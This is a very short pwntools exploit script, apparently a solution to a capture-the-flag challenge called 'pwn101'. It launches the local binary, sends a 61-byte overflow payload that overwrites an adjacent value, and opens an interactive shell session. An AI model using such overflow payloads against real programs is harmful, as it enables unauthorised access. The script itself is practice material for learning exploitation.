from pwn import *

p = process('./pwn101-1644307211706.pwn101')

#payload = b'A' * 60 + b'A'
payload = ('A' * 60).encode() + b'f'
# payload = 'A' *  61 

p.recv()
p.sendline(payload)
p.interactive()